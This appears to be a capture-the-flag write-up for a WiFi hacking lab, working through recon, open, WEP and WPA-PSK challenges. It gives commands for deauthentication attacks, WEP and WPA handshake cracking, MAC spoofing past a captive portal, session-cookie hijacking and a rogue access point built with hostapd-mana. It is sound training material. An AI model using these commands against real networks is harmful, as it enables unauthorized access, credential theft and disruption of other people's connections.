# WiFi Challenge

## Recon

### What is the channel that the wifi-global Access Point is currently using?

Start a monitoring interface

```
sudo airmon-ng start wlan0mon
```

and scan for the APs

```
sudo airodump-ng wlan0mon -b a
```

<figure><img src="../.gitbook/assets/immagine (3).png" alt=""><figcaption></figcaption></figure>

### What is the MAC of the wifi-IT client?

Wifi-IT channel is 11 so we need to find client on the channel 11

```
sudo airodump-ng wlan0mon -c 11
```

<figure><img src="../.gitbook/assets/immagine (4).png" alt=""><figcaption></figcaption></figure>

### What is the probe of 78:C1:A7:BF:72:46?

```
sudo airodump-ng wlan0mon 
```

### What is the ESSID of the hidden AP (mac F0:9F:C2:6A:88:26)?

```bash
cat ~/rockyou-top100000.txt | awk '{print "wifi-" $1}' > ~/wifi-rockyou.txt
```

Once we have the modified dictionary we can use “mdk4” to launch probes with each of the ESSIDs until the AP responds.

```bash
airmon-ng start wlan0 
iwconfig wlan0mon channel 11
mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt
```

## OPN

### What is the flag in the hidden AP router behind default credentials?

Once we know your ESSID we can connect to the network, for that we create a “free.conf’ file to connect from bash using “wpa\_supplicant”.

```bash
network={
	ssid="$ESSID"
	key_mgmt=NONE
	scan_ssid=1
}
```

```bash
wpa_supplicant -Dnl80211 -iwlan2 -c free.conf
```

In another terminal as root:

```bash
dhclient wlan2 -v
```

Once connected to the network and get IP with “dhclient” we can access the IP at IP 192.168.16.1 where we see a login where we can test default credentials such as admin/admin, accessing the admin panel where you can find the flag.

### What is the flag on the AP router of the wifi-guest network?

For this challenge we have to access the wifi-guest network and bypass the captive portal. We can connect with the same method as in the previous challenge, but when we try to access the AP we find a captive portal that asks us for credentials. The AP is in the channel 6, so can monitor it first.

To bypass this login we can use the MAC of a client connected to that network that we see with traffic, for that we can use airodump-ng again and impersonate one of those MAC.

```bash
systemctl stop network-manager
ip link set wlan2 down
macchanger -m b0:72:bf:44:b0:49 wlan2
ip link set wlan2 up
```

next we can connect again

```bash
wpa_supplicant -Dnl80211 -iwlan2 -c open.conf
```

```bash
sudo dhclient -v wlan2
```

<figure><img src="../.gitbook/assets/openlogin.png" alt=""><figcaption></figcaption></figure>

To obtain the login credentials we make a capture of “airodump-ng” saving the output with “-w” and after a while (3–5 min approx) we can see HTTP requests in the “.cap” file with “wireshark” in which there is a POST with username and password.

## WEP

### What is the flag on the wifi-old AP website?

Start by launching airdump on th wifi

```
sudo airodump-ng -c 3 -w old --essid wifi-old --bssid F0:9F:C2:71:22:11 wlan0mon
```

<figure><img src="../.gitbook/assets/immagine (7).png" alt=""><figcaption></figcaption></figure>

and then launch arp attack with airplay

```
sudo aireplay-ng -3 -b F0:9F:C2:71:22:11 -h CE:62:DE:B1:FC:73 wlan0mon
```

now you can use aircrack to crack the password

```
aircrack-ng old-02.cap
```

<figure><img src="../.gitbook/assets/immagine (8).png" alt=""><figcaption></figcaption></figure>

Once we have the password we can connect to the WEP network:

Create a configuration file to connect to the WEP network.

```bash
nano wep.conf
```

The content should look like this.

```bash
network={
  ssid="wifi-old"
  key_mgmt=NONE
  wep_key0=11bb33cd55
  wep_tx_keyidx=0
}
```

Now we can connect to the WEP network with our configuration file.

```bash
wpa_supplicant -D nl80211 -i wlan2 -c wep.conf
```

We should try to retrieve an IP address from the DHCP server.

```bash
dhclient wlan2 -v
```

## PSK

### What is the wifi-mobile AP password?

For this challenge we have to obtain the password of a normal PSK network, for this we have to monitor the traffic with “airodump-ng” and wait for a client to connect or force a deauth attack with “aireplay-ng”.

```bash
airodump-ng -c 6 -w mobile --essid wifi-mobile --bssid F0:9F:C2:71:22:12 wlan0mon
```

In parallel

```bash
aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon
```

and then crackit&#x20;

```
aircrack-ng -w rockyou-top100000.txt mobile-01.cap
```

<figure><img src="../.gitbook/assets/immagine (9).png" alt=""><figcaption></figcaption></figure>

### What is the IP of the web server in the wifi-mobile network?

If we have a handshake and the network password, we can decrypt the traffic of each of the users after the handshake, making it very similar to the open networks in the previous section.

For this we can use “airdecap-ng” and then open the generated file with “Wireshark” to obtain the IP of the HTTP server.

```bash
airdecap-ng -e wifi-mobile -p starwars1 mobile-01.cap
```

then open the decrypted file with wireshark. get the cookie **PHPSESSID=u7bbth00ot6na3uinle9ll2i2a**

### what is the flag after login in wifi-mobile?

The first thing we have to do is to connect to the network, for that we can use “wpa\_supplicant” again, with the following configuration file mobile.conf

```bash
network={
    ssid="wifi-mobile"
    psk="starwars1"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
```

```bash
wpa_supplicant -Dnl80211 -iwlan3 -c mobile.conf
```

```bash
dhclient wlan3 -v
```

inject the cookie in the website

### Is there client isolation in the wifi-mobile network?

To do this we can use “arp-scan” to get the IPs and curl their HTTP server to get the flag.

```bash
arp-scan -I wlan3 -l
curl 192.168.2.7
```

### What is the wifi-offices password?

The wifi-offices network is not visible, so it is in another location or maybe it is no longer there, but we can still get its password by creating a fake AP with “hostapd-mana” and get the handshake of the clients that ask for this network in their Probes to perform a dictionary attack against it and get the password in clear text.

hostapd.conf

```bash
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=wifi-offices
mana_wpaout=hostapd.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```

```bash
hostapd-mana hostapd.conf
```

<figure><img src="../.gitbook/assets/hostapd-mana.png" alt=""><figcaption></figcaption></figure>

Once we have obtained the handshake we can crack it using “hashcat”

```bash
hashcat -a 0 -m 2500 hostapd.hccapx ~/rockyou-top100000.txt --force
```
